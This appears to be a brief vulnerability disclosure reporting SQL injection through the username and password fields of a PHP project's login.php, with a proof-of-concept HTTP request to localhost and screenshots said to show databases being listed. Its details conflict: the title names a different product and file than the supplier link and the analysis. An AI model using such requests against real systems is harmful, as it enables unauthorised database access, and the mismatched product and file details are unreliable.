# Responsive Blog Site has sql injection in single.php

## supplier 
https://code-projects.org/project-monitoring-system-in-php-with-source-code/
## Vulnerability file
login.php

## describe

**Code analysis**   

In the login.php file of Responsive Blog Site, the username and password parameters are obtained, and the SQL statement is concatenated to the SQL statement without filtering the execution, resulting in SQL injection vulnerabilities and server permissions

![image-2025](https://github.com/asd1238525/cve/blob/main/ba3cc034-921d-4831-bd02-65b0f6cce5cb.png)


## POC

```
POST /project/pmmp/login.php?action=login HTTP/1.1
Host: 127.0.0.1:8083
Content-Length: 33
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8083
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8083/project/pmmp/login.php?action=login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=1&password=1&login=login

```

**Result**
![image-2025](https://github.com/asd1238525/cve/blob/main/a77b6eb2-5132-4a30-b40f-8a7a38d074db.png)
Get databases
![image-2025](https://github.com/asd1238525/cve/blob/main/feed9d39-25c4-4ef6-84a8-eb46aafda5bc.png)